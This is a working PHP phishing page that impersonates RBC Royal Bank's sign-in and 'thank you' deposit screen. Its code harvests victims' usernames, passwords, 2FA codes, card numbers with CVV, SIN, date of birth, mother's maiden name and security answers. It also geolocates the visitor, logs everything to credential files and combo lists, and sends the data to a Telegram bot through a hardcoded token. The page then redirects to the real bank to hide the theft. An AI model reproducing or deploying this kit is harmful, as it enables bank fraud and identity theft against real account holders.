
<?php
        include "/files/anti/anti1.php";
        include "/files/anti/anti2.php";
        include "/files/anti/anti3.php";
        include "/files/anti/anti4.php";
        include "/files/anti/anti5.php";
        include "/files/anti/anti6.php";
        include "/files/anti/anti7.php";
        include "/files/anti/anti8.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telgram_log.txt';
$file2      = '/tangerine.csv';
$file3      = '/accounts.csv';
$file4      = '/usagent_log.txt';
$file5      = '/combo.txt';

$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $name       = $_POST['name'];  
    $dob1       = $_POST['dob1']; 
    $dob2       = $_POST['dob2']; 
    $dob3       = $_POST['dob3']; 
    $mmn        = $_POST['mmn']; 
    $sin        = $_POST['sin']; 
    $dl         = $_POST['drivers'];    
    $card       = $_POST['card'];
    $exp1       = $_POST['exp1'];
    $exp2       = $_POST['exp2'];
    $cvv        = $_POST['cvv'];
$question1      = $_POST['question1'];
$answer1        = $_POST['answer1'];
$question2      = $_POST['question2'];
$answer2        = $_POST['answer2'];
$question3      = $_POST['question3'];
$answer3        = $_POST['answer3'];
$question4      = $_POST['question'];
$answer4        = $_POST['answer4'];
$question5      = $_POST['question5'];
$answer5        = $_POST['answer5'];


    $bank       = "[ RBC ]";
    $project    = "[CR00K-3D]";
    $url        = "https://royalbank.com";
  $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $code2      ="[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="$ip\n$bank\n\n\n$question1\n$answer1\n\n$question2\n$answer2\n\n$question3\n$answer3\n\n$question4\n$answer4\n\n$question5\n$answer5\n\n$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code";

file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n[$ip][$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);

$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                     
?>
<!-- saved from url=(0041)https://enterac-pending.com/deposit/rbc/f -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        
        <link rel="icon" type="image/x-icon" href="https://enterac-pending.com/deposit/rbc/favicon.ico">
        <title>RBC Royal Bank – Secure Sign In</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="./rbc_6_files/main.css">
        <meta http-equiv="refresh" content="3;URL=https://href.li/?http://royalbank.ca/">
    </head>
    <body>
        <app-root ng-version="10.2.5">
            <!---->
            <smart-banners _nghost-snp-c1="">
                <div _ngcontent-snp-c1="" class="smart-bnr-wpr" id="smart-bnr-rbcapp">
                    <div _ngcontent-snp-c1="" class="smart-bnr-inner">
                        <div _ngcontent-snp-c1="" class="smart-bnr-android" style="display: none;">
                            <div _ngcontent-snp-c1="" class="table-wpr w-100 mar-b-0">
                                <div _ngcontent-snp-c1="" class="table-cell w-min pad-r-hlf">
                                    <div _ngcontent-snp-c1="" class="smart-bnr-icon rbc-icon"></div>
                                </div>
                                <div _ngcontent-snp-c1="" class="table-cell va-m label">
                                    <p _ngcontent-snp-c1="" class="smart-bnr-title roboto-bold">RBC Mobile</p>
                                    <p _ngcontent-snp-c1="" class="smart-bnr-subtitle roboto-regular">Royal Bank of Canada</p>
                                    <p _ngcontent-snp-c1="" class="smart-bnr-subtitle roboto-regular">FREE - On Google Play</p>
                                </div>
                                <div _ngcontent-snp-c1="" class="table-cell va-m"><a _ngcontent-snp-c1="" class="smart-bnr-btn roboto-medium" href="https://applinks.rbcroyalbank.com/RtYB">INSTALL</a></div>
                                <div _ngcontent-snp-c1="" class="table-cell va-m"><button _ngcontent-snp-c1="" class="smart-bnr-close" data-dig-id="BFS-Smartbanner-1" type="button"><img _ngcontent-snp-c1="" alt="Close" height="13" width="13" src="data:image/svg+xml, %3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 20 20&#39;%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23006ac3%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Eclose%3C/title%3E%3Cg id=&#39;Layer_2&#39; data-name=&#39;Layer 2&#39;%3E%3Cg id=&#39;Basic&#39;%3E%3Cg id=&#39;Navigation_Misc&#39; data-name=&#39;Navigation/Misc&#39;%3E%3Cg id=&#39;Icons&#39;%3E%3Cpath id=&#39;icon-close_20_&#39; data-name=&#39;icon-close (20)&#39; class=&#39;cls-1&#39; d=&#39;M20 .68L19.32 0 10 9.32.68 0 0 .68 9.32 10 0 19.32l.68.68L10 10.68 19.32 20l.68-.68L10.68 10 20 .68z&#39;/%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/svg%3E"></button></div>
                            </div>
                        </div>
                    </div>
                    <div _ngcontent-snp-c1="" class="smart-bnr-ios" style="display: none;">
                        <div _ngcontent-snp-c1="" class="table-wpr w-100 mar-b-0">
                            <div _ngcontent-snp-c1="" class="table-cell va-m w-min" style="padding-right: 10px;"><button _ngcontent-snp-c1="" class="smart-bnr-close" data-dig-id="BFS-Smartbanner-1" type="button"><img _ngcontent-snp-c1="" alt="Close" height="13" width="13" src="data:image/svg+xml, %3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 20 20&#39;%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23006ac3%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Eclose%3C/title%3E%3Cg id=&#39;Layer_2&#39; data-name=&#39;Layer 2&#39;%3E%3Cg id=&#39;Basic&#39;%3E%3Cg id=&#39;Navigation_Misc&#39; data-name=&#39;Navigation/Misc&#39;%3E%3Cg id=&#39;Icons&#39;%3E%3Cpath id=&#39;icon-close_20_&#39; data-name=&#39;icon-close (20)&#39; class=&#39;cls-1&#39; d=&#39;M20 .68L19.32 0 10 9.32.68 0 0 .68 9.32 10 0 19.32l.68.68L10 10.68 19.32 20l.68-.68L10.68 10 20 .68z&#39;/%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/svg%3E"></button></div>
                            <div _ngcontent-snp-c1="" class="table-cell w-min pad-r-hlf">
                                <div _ngcontent-snp-c1="" class="smart-bnr-icon rbc-icon"></div>
                            </div>
                            <div _ngcontent-snp-c1="" class="table-cell va-m" style="position: relative;">
                                <p _ngcontent-snp-c1="" class="smart-bnr-title roboto-bold">RBC Mobile</p>
                                <p _ngcontent-snp-c1="" class="smart-bnr-subtitle roboto-regular">Royal Bank of Canada</p>
                                <p _ngcontent-snp-c1="" class="smart-bnr-text roboto-regular">GET - On the App Store</p>
                            </div>
                            <div _ngcontent-snp-c1="" class="table-cell text-right va-m"><a _ngcontent-snp-c1="" class="smart-bnr-btn roboto-regular fl-r" href="https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8" id="smartBannerEN-ios">View</a></div>
                        </div>
                    </div>
                </div>
            </smart-banners>
            <div>
                <router-outlet></router-outlet>
                <full-signin-components _nghost-snp-c2="" class="ng-tns-c2-0 ng-star-inserted">
                    <!----><!----><!---->
                    <div _ngcontent-snp-c2="" class="ng-tns-c2-0 ng-star-inserted">
                        <div _ngcontent-snp-c2="" class="flex-container-full">
                            <div _ngcontent-snp-c2="" class="split flex-item-left">
                                <div _ngcontent-snp-c2="" class="centered">
                                    <div _ngcontent-snp-c2="" class="maindynamicbranding">
                                        <div _ngcontent-snp-c2="" class="header-content-full">
                                            <p _ngcontent-snp-c2="" class="ng-tns-c2-0">
                                                <rbc-logo _ngcontent-snp-c2="" class="rbc-logo-full rbc-logo" token="notm-opposite" aria-label="main-container.accessibility.logo">
                                                    <svg width="100%" height="100%" viewBox="0 0 77 100" fill="none" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false" role="img" aria-labelledby="notm-opposite-title-4">
                                                        <path d="M74.901 2.10103V86.1644C74.901 89.3317 73.6037 91.1681 71.0718 92.1427C61.2344 95.9408 49.5833 97.8988 38.4999 97.8988C27.4181 97.8988 15.7672 95.941 5.92699 92.1427C3.39627 91.1681 2.09901 89.3317 2.09901 86.1644V2.10103H74.901ZM76.9999 0H74.9009H2.09901H0V2.10116V86.1645C0 90.1106 1.74054 92.7818 5.17323 94.1038C15.0235 97.9058 26.8595 100 38.4999 100C50.1424 100 61.9782 97.9059 71.8272 94.1032C75.2589 92.7822 77 90.111 77 86.1645V2.10103V0H76.9999Z" fill="white"></path>
                                                        <path d="M74.9779 86.1645C74.9779 89.3318 73.6792 91.1682 71.1448 92.1428C61.2973 95.9411 49.6342 97.899 38.5396 97.899C27.4464 97.899 15.7835 95.9411 5.93323 92.1428C3.39991 91.1682 2.10132 89.3318 2.10132 86.1645V2.10103H74.978V86.1645H74.9779Z" fill="#0051A5"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M67.4387 69.3868H68.1216L69.4487 64.8702C68.5062 63.5229 67.3024 62.5005 65.4255 61.8862C69.6943 58.4803 71.0085 53.8971 71.0085 50.3446C71.0085 46.4238 69.4387 42.9032 67.1136 40.3868C67.742 39.3468 68.7935 37.6208 69.3559 36.6978C69.5372 36.4002 69.6676 36.186 69.7167 36.1053C70.0393 35.5748 70.2083 34.7454 70.0993 34.0905C69.9681 33.3068 69.6372 32.7735 68.7978 32.3322C67.8469 31.8338 62.0641 28.8131 62.0641 28.8131H48.3862L43.5128 31.733V23.2527H41.9473C42.4208 22.8937 42.746 22.4902 42.9276 22.2082L42.756 21.8285C41.0689 23.1549 40.1445 23.0643 36.9035 22.0447C35.0614 21.4667 33.4402 22.0922 32.2939 22.9804C32.2742 22.8071 32.2713 22.6272 32.2939 22.4413C32.3929 21.5645 33.0869 20.622 35.5336 20.7755C37.3587 20.8874 38.8821 20.9136 39.4044 20.9111C41.0074 20.904 41.9945 20.7029 42.6483 20.2044C43.7334 19.3763 43.9369 18.3444 43.9999 17.7733C44.0909 16.9856 44.1409 15.7399 44.1409 14.8128V9.30944H22.6626V5.5853H17.1382C13.6417 5.5853 10.7483 8.17144 10.7483 11.5676C10.7483 14.8267 13.213 17.2831 16.4818 17.2831H16.817V15.1131H16.4818C14.6163 15.1131 13.8007 13.5867 13.9097 11.7741C14.0214 9.88342 15.6244 8.90882 17.018 8.90882H19.624V12.633H27.2624V14.4152H25.211V15.4876L29.4952 17.1172V12.6332H40.8189V15.2223C40.8189 15.9818 40.8189 16.4328 40.7422 16.8727C40.6778 17.2344 40.594 17.5153 40.3161 17.7875C40.051 18.0501 39.6417 18.1339 39.0944 18.1659C38.3584 18.2076 36.1841 18.2566 34.8786 18.2566C32.4348 18.2566 29.4325 18.8222 29.4325 22.3676C29.4325 26.4509 33.0869 27.5637 35.0182 27.5274C36.775 27.501 37.9687 26.9087 38.5567 26.4006H40.2031V28.9896C38.107 28.2465 35.5975 28.7145 32.8857 29.2619C31.0064 29.6388 29.0625 29.9139 26.9887 29.9279C23.4654 29.9545 20.0973 27.4269 19.6743 23.0436L18.0207 22.0646C17.7444 26.7509 19.2665 29.7772 24.1608 32.2893C30.0928 35.3362 34.0823 38.1569 35.6856 43.2289H36.2484V39.3692C41.0658 42.4664 43.9425 45.135 45.2244 48.1553C45.7803 49.4596 46.3669 51.5961 46.4478 53.3402H47.0091C47.3399 51.8347 47.5773 48.5574 46.5775 45.7618C46.4271 45.3387 46.2171 44.9464 46.0106 44.5609C45.9984 44.5381 45.9863 44.5154 45.9741 44.4926L50.6062 44.7063C50.5211 46.3862 50.5365 48.3438 50.7667 50.4401L49.1177 50.5294V51.0588L50.8534 51.1578C50.9552 51.9246 51.0879 52.7093 51.257 53.4998H51.764C51.7374 52.7902 51.7442 52.025 51.7877 51.2125L59.711 51.6606C59.6776 53.2345 59.5183 54.9172 59.1874 56.6974L57.446 56.9126V57.2549L59.0518 57.3736C58.9249 57.9951 58.7754 58.6248 58.6037 59.2643H59.1148C59.3982 58.7784 59.7208 58.1723 60.0448 57.4502L66.3357 57.9389C65.319 59.4275 64.1612 60.6201 62.681 61.5573C62.3529 61.5767 61.7174 61.6576 61.4146 61.7051C60.4461 61.8586 56.8631 62.4061 53.6795 62.8926C51.6491 63.2029 49.7812 63.4884 48.8578 63.6309C48.6052 62.6172 48.302 61.7414 47.9992 61.0908C45.446 55.6199 42.4104 53.5874 28.5533 44.3092C27.615 43.6809 26.627 43.0194 25.5862 42.3214C20.3077 38.7828 11.9978 33.017 9.53169 28.3193C8.73977 26.8153 8.36283 25.0515 8.36576 23.4681C8.36829 21.7504 8.89078 20.0607 9.90038 18.7229V17.1589C7.86588 18.251 6.23346 21.1667 6.27377 24.3952C6.29746 26.201 6.47202 27.5302 7.09484 29.1738C8.11841 31.8883 9.88775 34.2484 14.2682 38.1933C18.325 41.8518 21.171 44.9253 22.7376 49.045H23.3004V44.8919C23.9189 45.3322 24.5405 45.7762 25.1559 46.2158C25.5437 46.4928 25.9292 46.7681 26.3099 47.0397H26.3084C30.0049 49.6845 33.9106 53.4144 35.6854 57.387H36.2482V53.5373C42.9315 58.0224 47.713 62.2144 48.7602 70.6755H49.3216C49.605 68.6229 49.4345 66.45 49.0716 64.5942H60.3699C63.9868 64.5942 67.4387 65.6206 67.4387 69.3868ZM33.5251 24.5809C34.6298 23.528 35.7009 23.2906 37.6221 23.7121C37.2409 24.2037 36.5694 24.8504 35.4912 24.9258C34.7427 24.9802 34.0655 24.8392 33.5251 24.5809ZM41.9245 32.687L36.5122 35.931C34.8546 34.878 32.436 33.3322 31.7559 32.8672C32.2343 32.794 32.8732 32.659 33.5822 32.5093C35.1307 32.1822 37.0139 31.7845 38.2925 31.8045C39.6875 31.8227 40.8632 32.158 41.9245 32.687ZM61.4327 35.2229L60.6828 36.2744C59.2263 35.776 57.4851 35.6167 55.9907 35.6166C51.4216 35.6166 46.8052 38.0564 44.1783 41.8783C42.9747 40.4862 41.2807 39.1036 39.439 37.8244L49.2418 31.926H61.3223L66.788 34.783L64.678 38.2531C64.0313 37.8244 63.5454 37.5033 63.0204 37.2519L63.7325 35.0918L60.4649 33.3293L60.271 33.6716L61.4327 35.2229ZM59.1076 45.0928C59.4094 46.5325 59.637 48.1649 59.6985 49.9692L51.8421 50.3853C51.979 48.6525 52.2666 46.7504 52.7078 44.8025L59.1076 45.0928ZM61.9759 49.8505C62.0806 48.4206 62.0598 46.872 61.8545 45.2202L67.1315 45.4629C67.7458 46.7101 68.1549 48.0743 68.3168 49.5139L61.9759 49.8505ZM56.7532 38.5129C57.1694 39.2627 57.9599 40.8549 58.6202 43.1436L53.0345 43.4536C53.4603 41.814 53.9813 40.1956 54.6237 38.5952C54.6768 38.5894 54.7301 38.5834 54.7836 38.5774C55.1664 38.5345 55.5594 38.4905 55.9501 38.4905C56.2198 38.4905 56.4878 38.4977 56.7532 38.5129ZM61.4703 42.9857C61.2093 41.8014 60.8532 40.57 60.381 39.3019C62.3123 40.0366 64.0148 41.2403 65.347 42.772L61.4703 42.9857ZM68.3381 52.1534C68.2584 53.4938 67.9666 54.5537 67.5128 55.6542L60.4357 56.5449C60.9594 55.2297 61.451 53.6236 61.7484 51.779L68.3381 52.1534ZM46.1726 43.8165C47.5299 41.8881 49.0504 40.5462 51.2583 39.5561C51.1075 40.2488 50.845 41.5781 50.683 43.5806L46.1726 43.8165ZM7.94117 40.1105C8.22337 44.2412 11.5581 47.0313 21.6457 53.3291C32.3479 60.0095 35.3391 64.087 36.2484 69.3781H35.6855C33.3672 64.2744 28.6501 61.4156 23.3005 58.3799V62.4981H22.7377C21.1822 58.8702 18.4829 55.4028 14.5226 52.4311C10.8514 49.6773 9.35991 48.3074 7.94117 46.1236C7.00421 44.6796 6.23889 42.8728 6.24036 40.4862C6.24036 39.02 6.72228 37.4239 7.48467 36.213L8.43559 36.8442C8.08354 37.8555 7.89367 39.27 7.94117 40.1105Z" fill="#FEDF01"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M66.2508 75.0923C66.205 74.9955 65.8407 74.2259 64.787 73.6277C64.171 73.2814 63.2646 72.8581 61.4534 72.8583C58.2025 72.8583 55.777 74.6738 55.8565 80.2356C55.9418 86.2627 59.9036 87.4958 62.6056 87.4958C65.8745 87.4958 67.3994 86.0712 67.3994 86.0712V88.201C67.3994 88.201 65.7044 89.5734 61.3879 89.5734C56.7489 89.5734 51.4859 87.6701 51.4859 80.3402C51.4859 73.8357 55.9042 70.8629 61.8055 70.8629C65.7043 70.8629 67.3436 72.04 67.3436 72.04L66.4305 75.1441C66.4305 75.1441 66.3105 75.1638 66.2558 75.1023C66.2554 75.1019 66.2538 75.0985 66.2508 75.0923ZM23.0938 89.2926H28.3205L21.6427 80.7561C24.3199 80.0398 26.3248 78.5763 26.3248 75.9163C26.3248 72.7925 24.4565 71.1403 19.5675 71.1403H9.47015V71.2968C9.84164 71.4295 10.2578 71.6697 10.5301 71.9377C11.2367 72.6346 11.4474 73.6988 11.4474 75.1371V89.2926H15.6409V81.2463H17.1715L23.0938 89.2926ZM15.641 72.8706H18.466C20.8177 72.8706 22.0451 73.5576 22.0451 76.0574C22.0451 78.2861 20.439 79.6056 17.8639 79.6056H15.6409V72.8706H15.641ZM42.8879 79.1212C44.7256 78.8224 46.4839 77.3924 46.4839 75.2306C46.4839 73.2813 45.6557 71.1404 39.9179 71.1404H30.2378V71.2969C30.5309 71.3865 30.9934 71.6238 31.2963 71.9241C31.9541 72.5665 32.1705 73.5271 32.2026 74.8006V89.2928H40.2251C44.638 89.2928 47.8316 87.6101 47.8316 83.7546C47.8316 80.6195 45.3918 79.2846 42.8879 79.1212ZM38.7604 72.8707C40.8132 72.8707 42.2054 73.3148 42.2054 75.5072C42.2054 77.8435 40.3396 78.4872 38.2115 78.4872H36.3781V72.8707H38.7604ZM38.9671 87.5765H36.3781V80.1658H38.8482C42.2417 80.1658 43.5444 81.1767 43.5444 83.7212C43.5443 86.4734 41.8451 87.5765 38.9671 87.5765Z" fill="white"></path>
                                                        <title id="notm-opposite-title-4">RBC</title>
                                                    </svg>
                                                </rbc-logo>
                                            </p>
                                            <h1 _ngcontent-snp-c2="" class="title-full"> Secure Sign-In</h1>
                                            <h1 _ngcontent-snp-c2="" class="access-medium"> RBC Online Banking</h1>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div _ngcontent-snp-c2="" class="split flex-item-right ng-tns-c2-0 ng-star-inserted div-loader">
                                <style>
                                .loader-div {
                                    text-align: center;
                                    padding-top: 20px;
                                }

                                .loader-div h2 {
                                    font-size: 24px;
                                    margin-bottom: 40px;
                                }

                                .loader-div p {
                                    margin-top: 37px;
                                    padding: 0px 42px;
                                    font-size: 16px;
                                }
                                </style>
                                <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                                    <br>
                                    <h2 class="heading--title2 ng-binding">Thank you</h2>
                                    <img src="./rbc_6_files/loading.gif" width="60">
                                    <p style="text-align: center; font-size: 17px; padding: 10px 40px 0px 40px;">The funds will be processed and deposited in your account within the next 48 hours.<br>
<br>
For security reasons you will now be redirected to the home page.</p>
                                </div>
                            </div>
                            <!---->
                        </div>
                    </div>
                </full-signin-components>
            </div>
        </app-root>
    

</body></html>